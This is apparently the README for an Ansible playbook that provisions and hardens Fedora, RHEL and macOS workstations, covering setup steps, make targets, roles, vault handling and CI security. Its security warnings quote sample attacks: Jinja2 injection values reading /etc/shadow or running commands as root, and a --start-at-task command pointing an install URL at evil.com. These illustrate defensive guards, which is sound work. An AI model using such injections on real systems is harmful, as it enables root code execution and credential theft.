# laptop-setup

Ansible workstation provisioning playbook for Fedora, RHEL CSB, and macOS.

## Quick Reference

**⚠️ SECURITY WARNING: Config.yml Template Expression Injection (SSTI)**

Ansible loads `config.yml` with `trusted_as_template=True`, allowing Jinja2 template expressions
(e.g., `{{ ... }}` and `{% ... %}`) to be evaluated as arbitrary code. The playbook's
`common/tasks/pre_flight_checks.yml` (lines 73-96) comprehensively scans ALL config.yml values—
strings, list elements, dict values—and rejects any containing template markers before any task executes.

**Risk**: If you inadvertently include a Jinja2 expression in config.yml, it will be evaluated
with the privilege level of the provisioning play (become: true in Play 1). For example:
```yaml
# DANGEROUS — do NOT use:
system_aide_monitoring_etc_paths: ["{{ lookup('pipe', 'whoami') }}"]  # RCE as root
dotfiles_goprivate: "{{ lookup('file', '/etc/shadow') }}"  # file disclosure
```

**Solution**: Use the YAML `!unsafe` tag to mark legitimate braces as literal text:
```yaml
# SAFE — uses !unsafe for values with braces:
dotfiles_goprivate: !unsafe 'gitlab.internal.com,pkgs.devel.redhat.com'
system_aide_monitoring_etc_paths: !unsafe ['/etc/ssh/sshd_config.d']
```

The `!unsafe` tag prevents Ansible from interpreting the value as a template, treating it as
literal text instead. For plain values without braces (names, emails, paths), the `!unsafe` tag
is unnecessary but harmless.

**⚠️ SECURITY WARNING: Do NOT use `--start-at-task` to resume provisioning**

The playbook's security architecture depends on pre_tasks validations running before all roles
execute. Using Ansible's `--start-at-task` flag skips play-level pre_tasks, bypassing critical
security checks (SSTI guard, URL validation, version format validation, identity variable assertions).

**Risk**: An attacker can use `--start-at-task` to inject malicious config values that would
normally be caught by pre_flight_checks.yml. For example:
```bash
ansible-playbook site.yml --start-at-task "Download Claude Code install script" \
  -e "claude_install_url=https://evil.com/malicious.sh"
```

**Mitigation**: Validation assertions are duplicated at the START of each role's main.yml with
`tags: [always]` to protect against this attack. However, the safest approach is to avoid
`--start-at-task` entirely. Instead:

1. Restart from the beginning: `make all` (full re-run is safe and idempotent for most tasks)
2. Or manually run individual roles: `make packages` (runs roles/packages with full pre-flight checks)
3. Never use `--start-at-task` except during active debugging, and only after confirming the
   running host is trusted and config.yml has not been modified.

**⚠️ Internal SSH Git Hosts (Work Profile)**

If your work profile clones repos from internal SSH git servers, configure `ssh_work_keyscan_hosts`
in `config.yml` with optional fingerprint pinning to prevent SSH MITM attacks:

```yaml
ssh_work_keyscan_hosts:
  - {host: internal-git.example.com, fingerprint: "SHA256:..."}
  - {host: gitlab.internal, fingerprint: "SHA256:..."}
```

Obtain fingerprints from internal IT via secure out-of-band channel. See `SECURITY.md` §
"Internal SSH Git Host Setup" for details. Omit `fingerprint` to use TOFU (first-use trust,
no pinning). GitHub SSH keys are auto-seeded via API; this step is only needed for internal hosts.

**⚠️ SECURITY WARNING: Vault Password Shell Tracing Exposure**

The vault password from `scripts/vault-pass.sh` is a secret. If provisioning runs with shell
tracing enabled (`set -x` or `bash -x make all`), the password is exposed in stderr and
becomes visible in CI logs (public, permanent), SSH transcripts, or strace output.

**Risk**: An attacker with access to CI logs or transcripts can extract the vault password
and decrypt `group_vars/all/vault.yml` offline, compromising all SSH keys and credentials.

**Mitigations**:
1. **Makefile guard**: `make -x` is forbidden and fails early with error message
2. **Script protection**: `scripts/vault-pass.sh` and `scripts/vault-pass-ci.sh` disable xtrace (`set +x`) before password output
3. **Never do**: `bash -x make all` or `set -x; make all`

**⚠️ SECURITY WARNING: USBGuard First Provision - Enumerate Devices Before Running**

The playbook enables USBGuard by default (system_install_usbguard: true), which will start enforcing USB device authorization on first provision. Devices present when USBGuard first starts are automatically allowed (PresentDevicePolicy=keep), but any device plugged in AFTERWARD will be blocked unless it matches a rule in /etc/usbguard/rules.conf.

**ThinkPad P16v Gen 1 AMD caveat**: ACPI reports internal USB devices as connect_type 'not used' instead of 'hardwired', so the base hardwired rule is ineffective. You MUST add VID:PID rules for internal devices.

**Before first provision:**
1. Connect ALL USB devices you regularly use (external drives, hubs, docks, keyboards, mice, etc.)
2. Run: lsusb
3. For each device you want to allow, add a rule to config.yml system_usbguard_extra_rules:
   ```yaml
   system_usbguard_extra_rules:
     - "allow id VVVV:PPPP"  # Replace VVVV:PPPP with VID:PID from lsusb
   ```
4. For USB mass storage, either add per-device rules OR ensure system_disable_usb_storage: false in config.yml (default is false)

**After first provision, if a device is blocked:**
1. Temporarily allow: `sudo usbguard allow-device <id>` (find id with: `sudo usbguard list-devices --blocked`)
2. Permanently add: Add rule to config.yml and re-run make system
3. To disable USBGuard entirely: Set system_install_usbguard: false in config.yml

See references/troubleshooting.md § "system: USBGuard Blocks YubiKey or Keyboard" for detailed guidance.

**First time on a new machine:**
0. **Enable Secure Boot in firmware** — Required for lockdown=integrity physical access protection. Enter UEFI/BIOS setup (typically F1/F2/Del at boot), navigate to Security settings, enable Secure Boot. Without Secure Boot, an attacker with physical access can boot a custom kernel that strips lockdown= and other hardening parameters from the kernel cmdline. smoke-test will emit FAIL for secure-boot until enabled.
1. `make bootstrap` — installs Ansible collections, git hooks, creates vault-pass.sh stub
   (fresh Fedora/RHEL: `sudo dnf install -y make` first; macOS: `xcode-select --install` + Homebrew from https://brew.sh first)
2. Copy `default.config.yml` to `config.yml` (`cp default.config.yml config.yml`) and replace
   each `CHANGE_ME` sentinel — at minimum `desktop_environment` (sway/i3/gnome), the four
   identity vars (`dotfiles_github_user`, `dotfiles_user_name`, `dotfiles_user_email_work`,
   `dotfiles_user_email_personal`), and `system_timezone`. Copying preserves the full
   optional-toggle comment block for reference.
3. Run `make setup-yubikeys` — programs your YubiKeys, writes `vault-pass.sh`, and guides next
   steps (FIDO2 PIN, SSH key generation, vault population). See `SECURITY.md` § "Setting Up
   vault-pass.sh" for the manual vault-pass.sh template if needed. Then populate
   `group_vars/all/vault.yml` with real SSH keys (see Vault section below) and encrypt:
   `ansible-vault encrypt group_vars/all/vault.yml`. For a first provision without real secrets,
   vault.yml ships as plaintext — `make all` works as-is but SSH keys won't be deployed.
   **WARNING**: if vault is unpopulated, no authorized_keys is written; after reboot sshd
   moves to port 722 and SSH login fails unless an out-of-band authorized_keys entry already
   exists. Populate the vault (or manually add your public key) before rebooting.
3b. `make preflight` — validate all pre-conditions before provisioning (fast; re-run after any config.yml change)
4. `make all` — full provisioning (asks for sudo password)
   **Run at the local console or inside tmux, NOT over SSH.** The system role restarts
   sshd mid-play, which sends SIGHUP to SSH sessions and kills the Ansible run. If you
   must use SSH, run inside tmux first: `tmux new-session -s provision 'make all'`
5. After provisioning, see `references/troubleshooting.md` for common surprises:
   SSH now on port 722, cups-browsed masked when system_disable_printing: true (default: unmasked but not started; CVE-2024-47176),
   AllowTcpForwarding local (set "no" in config.yml to disable; set "yes" for remote forwards too),
   IPv6 SLAAC disabled (set `system_ipv6_accept_ra: 2` in config.yml if home router provides IPv6 via RA; value 1 does not work when forwarding=1),
   kernel lockdown (integrity) applied via grubby on standard and hybrid (CSB-detected) Fedora; RHEL CSB skips this (IT manages boot config)
6. Required manual actions after `make all`:
   - **Reboot** — kernel security params (lockdown, IOMMU, vsyscall, init_on_free) only
     take effect after a reboot. SSH will be on port 722 after reboot.
     Pre-reboot window: kexec is only guarded by the `kexec_load_disabled` sysctl until
     lockdown=integrity activates; do not defer this reboot on machines where kexec attacks are a concern.
   - `make smoke-test` — verify provisioning succeeded before proceeding (catches failures early)
   - `tailscale up` to authenticate (interactive browser step)
   - `gh auth login` — GitHub CLI authentication (required for HTTPS git credential helper, notes clone, and claude queue-poller workflows)
   - `podman login registry.redhat.io` — work profile only, if `oc` is installed; required for RH subctl `oc image extract`; skip if vault `registry_tokens` provides automated auth (clears `registry-redhat-auth` WARN in smoke-test)
   - Log out and back in for group membership changes (libvirt, kvm groups)
   - For CSB/hybrid machines: `make container` to provision dev container
   - Re-run `make smoke-test` — confirms Tailscale WARN clears and no new failures

```bash
make all              # Full run (asks for sudo password)
make offline          # Full run without binary downloads (packages_install_binaries=false)
make minimal          # Dotfiles + SSH + repos only (no sudo)
make backup           # Back up dotfiles before re-provisioning
make backup-dry-run   # Dry-run backup to preview what would be copied
make bootstrap        # Initial setup (install deps, collections, hooks)
make update           # Update collections + full run (sets -e git_repos_pull=true to fetch upstream changes)
make lint             # ansible-lint + yamllint + shellcheck + markdownlint + check-vars-sync + script integrity checks (actionlint + zizmor if installed)
make shellcheck       # Run shellcheck on scripts and hooks (also run by lint)
make syntax-check     # Playbook syntax validation only
make markdownlint     # markdownlint on all .md files
make preflight        # Run preflight checks (CSB detection, prereqs) — run AFTER make bootstrap
make container        # Distrobox/toolbox dev container
make container-rebuild # Rebuild container from scratch
make test-fedora      # Molecule Fedora 44 tests (fast, Podman)
make test-rocky       # Molecule Rocky Linux 10 tests
make test-debian      # Molecule Debian 13 tests
make test-macos       # Molecule macOS tests
make test-container   # Molecule container provisioning scenario (distrobox/Podman)
make test-container-offline  # Molecule container rescue/degradation path (offline 404 scenario)
make test-container-offline-distrobox  # Molecule container-offline-distrobox rescue-path scenario (distrobox variant)
make test-distrobox-role  # Molecule distrobox-role scenario (distrobox role unit tests)
make test-packages-binaries  # Molecule packages-binaries scenario (kind, helm, kustomize, k9s, krew, gofumpt, subctl18; profile:work)
make test-vm          # Molecule Fedora 44 VM tests (full, Vagrant+libvirt)
make smoke-test       # Post-run verification (host)
make smoke-test-user  # Post-run verification (user-space only, no sudo; wraps smoke-test.sh --user-only)
make smoke-test-container  # Post-run verification (distrobox)
make check            # Dry run (--check mode)
make diff             # Dotfiles check+diff (dry run)
make csb-audit        # Preflight + common dry-run (CSB detection audit)
make test-scripts     # bash -n syntax-check of 8 scripts/ files + executes test-hooks-security.sh
make test-poller      # Unit tests for claude-queue-poller.sh helpers
make test             # shellcheck + script syntax + poller unit tests + molecule (Fedora/Rocky/Debian/container/container-offline/container-offline-distrobox/distrobox-role/packages-binaries/ssti-guard); Podman only
make ci               # Lint + syntax + test-scripts + test-poller + all non-VM molecule tests (adds test-macos over make test; uses lint+syntax-check instead of shellcheck + test-ssti-guard)
make bootstrap-test   # Install libvirt + Vagrant box (required before make test-vm)
make hooks            # Re-install git hooks without full bootstrap
make commitlint       # Validate commit messages from origin/main..HEAD
make check-vars-sync  # Verify vars sync between group_vars/all/vars.yml and roles/system/defaults/main.yml
make pip-lock         # Regenerate requirements-test.lock from current .venv
make pip-sync         # Create reproducible .venv from requirements-test.lock
```

**Individual role targets** (re-run a single role without a full `make all`):

```bash
make dotfiles         # dotfiles role only (no sudo)
make packages         # packages role only (sudo)
make ssh              # ssh role only (no sudo)
make notes            # notes role only (no sudo)
make repos            # git_repos role — all repo groups (no sudo)
make desktop          # desktop role only (sudo)
make system           # system role only (sudo)
make repos_dnf        # repos_dnf role only (sudo)
make redhat           # redhat role only (sudo)
make containers       # containers role only (sudo)
make claude           # claude role only (sudo)
make distrobox        # alias for make container (backwards compatibility)
# Per repo-group subsets of `make repos` — pattern rule: make repos-<group>
# runs git_repos role with repo_category=<group>; any category name is valid
make repos-ovnk       # OVN-Kubernetes repos only
make repos-konflux    # Konflux repos only
make repos-personal   # personal repos only (SSH-only; requires ssh-add before running)
make repos-bpfman     # bpfman repos only
make repos-downstream # downstream repos only
```

## Project Structure

- **site.yml** — 3 plays: system (become), user (no become), container (podman connection)
- **13 roles**: common, repos_dnf, system, packages, dotfiles, ssh, git_repos, notes, redhat, containers, desktop, distrobox, claude
- **common/** — Shared task files (CSB detection, failure handler, CSB report, container provisioning)
- **scripts/** — preflight.sh (`--profile work|personal`), smoke-test.sh (`--user-only` skips root checks),
  backup.sh, vault-pass.sh, vault-pass-ci.sh, test-queue-poller.sh
- **molecule/** — Test scenarios (fedora, rocky, container, container-offline, container-offline-distrobox, distrobox-role, debian, vm, macos, packages-binaries, ssti-guard); `shared/` holds reusable task includes (ci-pre-tasks.yml, capture-user-identity.yml, gather-minimal-facts.yml, verify-* checks, system-container-overrides.yml, etc.) imported by multiple scenario converge/verify playbooks; `system-container-overrides.yml` sets `system_is_container=true`, `csb_rhel/csb_detected/needs_container_tier` defaults, and ~20 other CI-critical variable overrides included by fedora/rocky/debian converge playbooks
- **System role task split**: `roles/system/tasks/main.yml` (orchestrator) delegates to 31 sub-files — `hardening_core.yml` (SELinux enforcement + sub-orchestrator that includes `mounts.yml` filesystem/tmpfs, `kernel_modules_blacklist.yml` kernel module blacklisting, `sysctl.yml` sysctl hardening, `firewall.yml` firewalld, `kernel_lockdown.yml` grubby kernel cmdline, `coredumps.yml` systemd-coredump config), `auditd.yml` (audit rules), `service_masking.yml` (mask/unmask), `logind.yml` (lid/suspend), `services.yml` (enable/disable), `bolt.yml` (Thunderbolt device authorization daemon), `sshd.yml` (SSHD hardening), `nm.yml` (NetworkManager), `session_timeout.yml` (TMOUT/shell timeout), `pam.yml` (PAM/faillock), `account_hardening.yml` (accounts/passwords), `dconf.yml` (GNOME dconf hardening), `aide.yml` (AIDE IDS), `aide_cleanup.yml` (AIDE cleanup when disabled — one-way ratchet prevention), `journald.yml` (journald persistent logging/retention), `dns_over_tls.yml` (DNS-over-TLS via systemd-resolved), `firmware.yml` (LVFS/fwupd firmware updates), `dnf_automatic.yml` (dnf-automatic unattended updates), `cron.yml` (cron access restriction), `authselect_fingerprint.yml` (authselect profile + fingerprint auth), `kernel_modules_kind.yml` (kernel modules for kind), `chrony.yml` (NTS authenticated time sync), `grub_password.yml` (GRUB bootloader password hash installation), `logrotate_sudo.yml` (sudo log rotation), and `timezone_locale.yml` (timezone, locale, console keymap); edit the sub-file, not main.yml or hardening_core.yml, when touching those subsystems (32 files total including main.yml)
- **Packages role task split**: `roles/packages/tasks/main.yml` delegates to `install_dnf_packages.yml` (dnf package installation: cli, languages, security, containers, networking; dnf only), `install_binary_downloads.yml` (SHA256-verified pinned binary downloads: kind, helm, kustomize, k9s; sets `_packages_linux_x86_work` fact), `install_binary.yml` (single-file curl+install), `install_tarball.yml` (tar.gz extract + copy), `install_subctl_versions.yml` (multi-version subctl fetcher for work profile), `install_go_tools.yml` (Go toolchain binary installs via `go install`), `install_oc_opm.yml` (oc/kubectl/opm fetcher for work profile), `install_standalone_binaries.yml` (standalone tool downloads: transcrypt, sops, gitleaks, actionlint, zizmor, operator-sdk, cosign, tkn, ec), `install_brew.yml` (Homebrew packages and autoupdate, macOS), `install_krew.yml` (kubectl krew plugin manager), `install_pipx.yml` (yamllint/ansible-lint via pipx), `install_virtualization.yml` (virtualization packages and post-install setup), and `verify_golang.yml` (Go toolchain version assertion) (plus main.yml = 14 task files total); add new binaries in the appropriate extractor file

## Key Patterns

- **Profile system**: `profile: work` (default) or `profile: personal` via `-e profile=personal` or `config.yml`
- **become convention**: Play 1 has play-level `become: true`. Play 2 tasks that need root use `become: true` + `tags: [become]`
- **is_dnf / is_apt**: Computed booleans in `group_vars/all/vars.yml` (set false there, overridden by `common/tasks/csb_detect.yml` at runtime). Use `when: is_dnf` / `when: is_apt` instead of `ansible_pkg_mgr` comparisons for package-manager branching across Fedora/RHEL (dnf) and Debian (apt) targets.
- **CSB detection**: `common/tasks/csb_detect.yml` sets `csb_detected` via two paths — RHEL (fapolicyd + internal CA present)
  or Fedora (FQDN ends in `.csb` + internal CA present). Determines `needs_container_tier`: `host-only`
  (standard Fedora/macOS — everything on host), `hybrid` (RHEL or CSB-detected Fedora — basics on host +
  dev tools in container), `container` (CSB restricted with fapolicyd enforcing — minimal host, full dev
  env via `make container`). Note: `csb_detected=true` + fapolicyd inactive = `hybrid`, not `container`.
- **csb_rhel**: Computed boolean (`group_vars/all/vars.yml`) — true when `csb_detected` and the host is RHEL (not Fedora); false on hybrid Fedora CSB. Used in rescue blocks and task conditions to route between IT-managed (RHEL CSB) and user-managed (Fedora hybrid) paths. Pattern: guards using `not csb_rhel` apply hardening to Fedora hybrid but skip on RHEL CSB; guards using `not csb_detected` skip on all CSB tiers.
- **CSB block/rescue**: Tasks that may fail on Corporate Standard Build use `block/rescue` to record failures for the CSB report
- **Config override**: `default.config.yml` (tracked) + `config.yml` (gitignored, user overrides). Key
  top-level variables: `profile` (work/personal), `desktop_environment` (auto/sway/i3/gnome), `ssh_port`
  (default 722); feature toggles `install_docker`, `install_vpn`, `install_virtualization`; repo toggles
  `repo_gh_cli`, `repo_google_chrome`, `repo_google_cloud_sdk`, `repo_rpmfusion_free`, `repo_rpmfusion_nonfree`, `repo_slack`,
  `repo_tailscale`, `repo_docker_ce`, `repo_mullvad`, `repo_redhat`; `repos_dnf_acli_baseurl` (define in config.yml to activate acli repo); container settings
  `container_name`, `container_image`, `container_release`, `container_replace`. See
  `default.config.yml` for full defaults; the `Additional toggles` comment block there lists 100+
  role-defaults vars overridable in `config.yml`. Key operational ones: `system_aide_enabled` (false —
  AIDE disabled by default; enable only with a log consumer), `system_tmout` (0 — disabled; set 1–900 to enforce CIS inactivity timeout),
  `system_disable_usb_storage` (false — USB drives allowed; set true to kernel-block usb_storage/uas), `system_kernel_lockdown`
  (integrity — kernel lockdown mode; set '' to disable for kdump/kgdb debugging; **note**: lockdown=integrity restricts kernel self-modification only — it does NOT enforce userspace binary integrity; Fedora default IMA mode is measure-only with no appraisal policy deployed), `system_ipv6_accept_ra`
  (0 — SLAAC disabled), `system_ssh_allow_tcp_forwarding` (local — set "no" to disable port forwarding; "yes" for both -L and -R),
  `system_ssh_allow_agent_forwarding` (no — set 'yes' to forward ssh-agent when SSHing into this machine; prefer ProxyJump for traversal),
  `system_dns_domains` (~. — catch-all for Tailscale MagicDNS), `system_ssh_max_sessions` (10),
  `system_enable_ip_forward` (true — enables ip_forward sysctls for Kubernetes/kind/Tailscale subnet routing; set false on terminal-only hosts), `system_install_usbguard`, `system_tlp_enabled`, `system_timezone`, `desktop_sway_hidpi_scale`, `desktop_i3status_battery_num`, `system_lid_switch`, `system_logind_idle_sec`,
  `system_coredump_storage` (external — systemd-coredump store path; 'none' disables), `system_coredump_process_size_max` (2G — max core size; 0 disables),
  `system_mask_abrt` (true — masks ABRT crash-reporter daemons; set false to restore ABRT, e.g. when `system_coredump_storage: none`),
  `system_disable_avahi` (true — masks avahi-daemon for mDNS/DNS-SD; set false to restore .local resolution),
  `system_core_pattern` (roles/system/defaults only — pipe target for kernel.core_pattern sysctl; toggle-managed, do NOT override via system_sysctl_extra),
  `system_chrony_service_enabled` (`not system_is_container` — chrony disabled in containers; import guard in main.yml prevents enabling chrony inside a container regardless of this variable),
  `system_dnssec_mode` (allow-downgrade — DNSSEC validation mode for systemd-resolved; set `yes` when also using `system_dot_mode: yes` for full strict DoT+DNSSEC enforcement; allow-downgrade pairs with opportunistic DoT),
  `containers_environment_d_enabled` (false — opt-in; writes DOCKER_HOST to environment.d so non-interactive shells like `make` can reach Podman; set true in config.yml only when using `make kind` for OVN-K/Submariner; disabled by default because systemd-environment-d-generator injects DOCKER_HOST into every graphical session process).
- **environment.d for Make**: `DOCKER_HOST` and `KIND_EXPERIMENTAL_PROVIDER=podman` are in both `.zshrc`
  (interactive shells) AND `~/.config/environment.d/containers.conf` (systemd user session generator).
  The environment.d path is critical for OVN-K/Submariner `make kind` since `make` spawns `sh` not
  `zsh` — see `troubleshooting.md` for the failure mode. Requires `containers_environment_d_enabled: true` in config.yml (opt-in; default false)

## Commit Conventions

- Format: `Scope: noun-phrase summary` — capitalize scope, no trailing period
- Scope is the primary role or file group changed; multi-role changes use `/`
  separator (`Notes/smoke:`) or `Multi:` for unrelated cross-cutting changes
- Max 72 characters total
- Always use `--signoff` (`-s`) when creating git commits
- The commit-msg hook rejects past-tense and gerund first words after the colon
  (Added, Fixed, Adding…) but noun-phrase descriptions are the established norm
- Scope values (capitalize in commits; commitlint.config.js enforces the same Title-Case values via type-enum): `Common`, `Repos-dnf`, `Packages`,
  `Dotfiles`, `Ssh`, `Git-repos`, `Notes`, `Redhat`, `Containers`, `Desktop`,
  `System`, `Distrobox`, `Claude`, `Ci`, `Docs`, `Chore`, `Smoke`, `Molecule`,
  `Multi`, `Sshd`, `Nm`, `Auditd`, `Backup`, `Handlers`, `Security`,
  `Vault`, `Preflight`, `Simplify`

## Vault

- Single vault file: `group_vars/all/vault.yml`
- Password via YubiKey HMAC-SHA1 via ykman: `make setup-yubikeys`
- Edit: `make vault-edit`
- vault-pass.sh implementation templates: see `SECURITY.md` § "Setting Up vault-pass.sh"
- **Do NOT define `vault_*` variables in `config.yml`** — `include_vars` (precedence 17) outranks
  `group_vars` (4-5), so any `vault_*` key in `config.yml` silently shadows the vault-encrypted
  value. A runtime `assert` in `common/tasks/pre_flight_checks.yml` (included by `site.yml`) enforces this.
- **GRUB password hash MUST be vault-sourced**: When using `system_grub_password_enabled: true`,
  generate the hash with `grub2-mkpasswd-pbkdf2` or `grub-mkpasswd-pbkdf2`, then store it in
  `group_vars/all/vault.yml` as `vault_grub_password_hash` (NOT in plaintext config.yml). The playbook
  automatically maps `vault_grub_password_hash` → `system_grub_password_hash` for use. Storing PBKDF2
  hashes in plaintext config.yml or CI artifacts enables offline brute-force attacks on bootloader
  authentication.

## Testing

- `make lint` — ansible-lint (production profile) + yamllint + check-vars-sync (shellcheck and markdownlint run as prerequisites; actionlint and zizmor run if installed)
- `make check-vars-sync` — Verify security hardening vars in sync between group_vars/all/vars.yml and roles/system/defaults/main.yml
- `make syntax-check` — Playbook syntax validation
- `make test-scripts` — Bash syntax-check of 8 scripts/ files (preflight.sh, smoke-test.sh, backup.sh, vault-pass-ci.sh, test-queue-poller.sh, verify-collections.sh, verify-ansible-args.sh, test-hooks-security.sh) + executes test-hooks-security.sh
- `make test-poller` — Unit tests for roles/claude/files/claude-queue-poller.sh internal helpers
- `make test` — shellcheck + test-scripts + test-poller + molecule (Fedora/Rocky/Debian/container/container-offline/container-offline-distrobox/distrobox-role/packages-binaries/ssti-guard);
  Podman only, no libvirt required. CI molecule coverage minus macOS (omits lint/syntax-check from full ci)
- `make ci` — Full CI pipeline locally: lint + syntax-check + test-scripts + test-poller + test-fedora
  + test-rocky + test-debian + test-macos + test-container + test-container-offline + test-container-offline-distrobox + test-distrobox-role + test-packages-binaries + test-ssti-guard (macOS runner required)
- `make test-fedora` — Molecule Fedora 44 (system, repos_dnf, common, packages, dotfiles, ssh, git_repos, notes, redhat, containers, desktop, claude)
- `make test-rocky` — Molecule Rocky Linux 10 (work profile, includes redhat role)
- `make test-debian` — Molecule Debian 13 (system, common, packages, dotfiles, ssh, git_repos, notes, containers, desktop, claude)
- `make test-container` — Molecule container scenario (distrobox/podman container provisioning)
- `make test-container-offline` — Molecule container-offline scenario: rescue block verification,
  fast failure via distrobox_oc_fetch_timeout: 5
- `make test-container-offline-distrobox` — Molecule container-offline-distrobox rescue-path scenario (distrobox variant)
- `make test-distrobox-role` — Molecule distrobox-role scenario (distrobox role unit tests)
- `make test-vm` — Molecule with Vagrant+libvirt (full system including firewall, sysctl, services); requires `make bootstrap-test` first
- `make smoke-test` — Post-provisioning verification (SSH, tools, hardening)
- CI runs linting + Fedora/Rocky/Debian/container/packages-binaries/macOS molecule tests on every PR, VM tests locally
- CI skips molecule on doc-only PRs (shell-based git diff, no third-party action)

## CI Security

- All third-party GHA actions SHA-pinned by commit hash
- actionlint, zizmor, and gitleaks run as SHA256-verified binary downloads
  (no third-party node actions — eliminates opaque `dist/index.js` supply chain risk)
- OSSF Scorecard runs weekly with SARIF upload to Security tab
- Branch protection on main: 6 required checks (Ansible Lint, Vault Encryption
  Check, Secret Detection, Ansible Syntax Check, Vars Sync Check, GPG Signature Verification), force push blocked, linear history
- GitHub secret scanning + push protection enabled
- **Ansible Galaxy Collections**: All four collections are vendored in `collections-dist/` with
  SHA256 verification, Python manifest comparison (`PYTHON_MANIFEST.json` TOCTOU checks), and
  mandatory code review gates. See `SECURITY.md` § "Ansible Collections Supply Chain" for
  vulnerability analysis, attack scenarios, and step-by-step code review procedure.
